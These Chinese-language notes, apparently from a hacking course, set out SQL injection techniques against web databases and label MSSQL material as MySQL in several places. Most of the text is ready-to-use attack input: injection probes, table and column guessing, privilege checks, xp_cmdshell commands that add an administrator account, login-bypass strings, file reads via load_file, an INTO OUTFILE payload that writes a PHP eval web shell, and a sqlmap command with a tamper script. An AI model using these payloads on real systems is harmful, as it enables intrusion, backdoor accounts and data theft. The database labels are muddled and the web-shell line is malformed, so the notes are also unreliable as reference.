# Mysql 服务、端口、后缀

重启服务，使其生效
命令 services.msc
TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING

1433端口是开启的。当我们关闭服务后，端口也将关闭

后缀
cracer.mdf

日志文件后缀

cracer_log.ldf

## mysql数据库权限

sa权限：数据库操作，文件管理，命令执行，注册表读取等system
db权限：文件管理，数据库操作等 users-adminstrators
public权限：数据库操作 guest-users

## 注入语句

1. 判断是否有注入
and 1=1
and 1=2
/
-0
判断注入的方法是一样的

2. 初步判断是否是mysql
and user>0

3. 判断数据库系统
and (select count(*) from sysobjects)>0 mysql
and (select count(*) from msyobjects)>0 access

4. 注入参数是字符
'and [查询条件] and "='

5. 搜索时没过率参数的
'and [查询条件] and '%25'='

6. 猜数表名
and (select Count(*) from [表名])>0

7. 猜字段
and (select Count(字段名) from 表名)>0

8. 猜字段中记录长度
and (select top 1 len(字段名) from 表名)>0

9. 猜字段的ascii值（access）
and (select top 1 asc(mid(字段名,1,1)) from 表名)>0
猜字段的ascii值（mysql）
and (select top 1 unicode(substring(字段名,1,1)) from 表名)>0

10. 测试权限结构（mysql）
and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
and 1=(select IS_SRVROLEMEMBER('serveradmin'));--
and 1=(select IS_SRVROLEMEMBER('setupadmin'));--
and 1=(select IS_SRVROLEMEMBER('securityadmin'));--
and 1=(select IS_SRVROLEMEMBER('diskadmin'));--
and 1=(select IS_SRVROLEMEMBER('bulkadmin'));--
and 1=(select IS_MEMBER('db_owner'));--

11. 添加mysql和系统的账户
exec master.dbo.sp_addlogin username;--
exec master.dbo.sp_password null,username,password;--
exec master.dbo.sp_addsrvrolemember sysadmin username;--
exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--
exec master.dbo.xp_cmdshell 'net user username password /add';--
exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';--

### 注入点权限判断

and 1=(select is_srvrolemember('sysadmin')) //判断是否是系统管理员
and 1=(select is_srvrolemember('db_owner')) //判断是否是库权限
and 1=(select is_srvrolemember('public')) //判断是否是public权限
and 1=covert(int,db_name())或1=(select db_name())  //当前数据库名
and 1=(select @@servername)  //本地服务名
and 1=(select HAS_DBACCESS('master')) //判断是否有库读取权限

# 工具使用

穿山甲 萝卜头 sqlmap等

# mysql函数

# 防注入绕过

大小写绕过
%00编码绕过

## 判断注入

and 1=1 返回正常
and 1=2 返回不正常 存在注入点

## 判断多少列

order by xx
order by 21 正常 order by 22 不正常 说明长度为21

## mysql显错注入

## 后台绕过

select * from user where username=" and password="
输入：admin'#
select * from user where username='admin'#' and password="
输入：admin' or '1=1
select * from user where username='admin' or '1=1' and password="

## mysql读写函数的使用

load_file()函数
该函数是用来读取源文件的函数
只能读取绝对路径的网页文件
在使用load_file()时应先找到网站绝对路径
例如：
d:/www/xx/index.php
/usr/src/apache/htdoc/index.php
注意：
1. 路径符号"\"错误"\\"正确"/"正确
2. 转换十六进制数，就不要''

## 获取网站根路径

1. 报错显示
2. 谷歌黑客
site:目标网站 warning
3. 遗留文件 phpinfo info test php
4. 漏洞爆路径
5. 读取配置文件

## 写入函数 into outfile

and 1=2 union select 1,"<?php
@eval($_POST['cracer'];?)>",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/netpub/wwwroot/mysql-sql/cracer.txt'

## 利用注入漏洞执行系统命令

## 魔术引号与宽字节注入

### 关于魔术引号注入

使用宽字节注入绕过魔术引号
%df%27
sqlmap.py -u "cracer.com/xx.php?id=1"
--risk 3 --dbms=mysql -p username --tamper unmagicquotes.py -v 3

